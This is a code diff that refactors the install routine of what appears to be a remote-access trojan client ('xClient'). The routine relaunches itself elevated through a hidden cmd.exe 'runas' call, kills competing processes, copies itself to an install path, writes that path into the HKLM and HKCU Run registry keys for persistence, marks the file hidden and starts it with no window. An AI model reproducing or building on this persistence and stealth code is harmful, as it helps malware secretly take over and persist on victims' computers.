@@ -265,12 +265,14 @@ namespace xClient.Core
 
             Application.Exit();
 
-            ProcessStartInfo processStartInfo = new ProcessStartInfo();
-            processStartInfo.FileName = "cmd.exe";
-            processStartInfo.Verb = "runas";
-            processStartInfo.Arguments = "/k START \"\" \"" + MyPath + "\" -CHECK & PING -n 2 127.0.0.1 & EXIT";
-            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            processStartInfo.UseShellExecute = true;
+            ProcessStartInfo processStartInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Verb = "runas",
+                Arguments = "/k START \"\" \"" + MyPath + "\" -CHECK & PING -n 2 127.0.0.1 & EXIT",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                UseShellExecute = true
+            };
             try
             {
                 Process.Start(processStartInfo);
@@ -284,7 +286,7 @@ namespace xClient.Core
 
         public static bool CreateMutex(ref Mutex mutex)
         {
-            bool createdNew = false;
+            bool createdNew;
             mutex = new Mutex(false, Settings.MUTEX, out createdNew);
             return createdNew;
         }
@@ -342,11 +344,11 @@ namespace xClient.Core
                 Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
 
             // delete existing file
-            if (File.Exists(SystemCore.InstallPath))
+            if (File.Exists(InstallPath))
             {
                 try
                 {
-                    File.Delete(SystemCore.InstallPath);
+                    File.Delete(InstallPath);
                 }
                 catch (Exception ex)
                 {
@@ -357,39 +359,38 @@ namespace xClient.Core
                         int myPid = Process.GetCurrentProcess().Id;
                         foreach (var prc in foundProcesses)
                         {
-                            if (prc.Id != myPid)
-                            {
-                                prc.Kill();
-                                isKilled = true;
-                            }
+                            if (prc.Id == myPid) continue;
+                            prc.Kill();
+                            isKilled = true;
                         }
                     }
                 }
             }
 
-            if (isKilled)
-                Thread.Sleep(5000);
+            if (isKilled) Thread.Sleep(5000);
 
             //copy client to target dir
-            File.Copy(SystemCore.MyPath, SystemCore.InstallPath, true);
+            File.Copy(MyPath, InstallPath, true);
 
             //add to startup
             if (Settings.STARTUP)
             {
                 if (AccountType == "Admin")
                 {
-                    try // try localmachine
+                    try // try LocalMachine
                     {
                         RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        key.SetValue(Settings.STARTUPKEY, SystemCore.InstallPath);
+                        if (key == null) throw new Exception();
+                        key.SetValue(Settings.STARTUPKEY, InstallPath);
                         key.Close();
                     }
-                    catch
+                    catch // if fails use CurrentUser
                     {
-                        try // if fails use currentuser
+                        try
                         {
                             RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                            key.SetValue(Settings.STARTUPKEY, SystemCore.InstallPath);
+                            if (key == null) throw new Exception();
+                            key.SetValue(Settings.STARTUPKEY, InstallPath);
                             key.Close();
                         }
                         catch
@@ -401,7 +402,8 @@ namespace xClient.Core
                     try
                     {
                         RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        key.SetValue(Settings.STARTUPKEY, SystemCore.InstallPath);
+                        if (key == null) throw new Exception();
+                        key.SetValue(Settings.STARTUPKEY, InstallPath);
                         key.Close();
                     }
                     catch
@@ -410,17 +412,26 @@ namespace xClient.Core
             }
 
             if (Settings.HIDEFILE)
-                File.SetAttributes(SystemCore.InstallPath, FileAttributes.Hidden);
+            {
+                try
+                {
+                    File.SetAttributes(InstallPath, FileAttributes.Hidden);
+                }
+                catch
+                { }
+            }
 
             //start file
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            startInfo.CreateNoWindow = true;
-            startInfo.UseShellExecute = true;
-            startInfo.FileName = SystemCore.InstallPath;
+            var startInfo = new ProcessStartInfo
+            {
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                UseShellExecute = true,
+                FileName = InstallPath
+            };
             Process.Start(startInfo);
 
-            SystemCore.Disconnect = true;
+            Disconnect = true;
         }
     }
 }
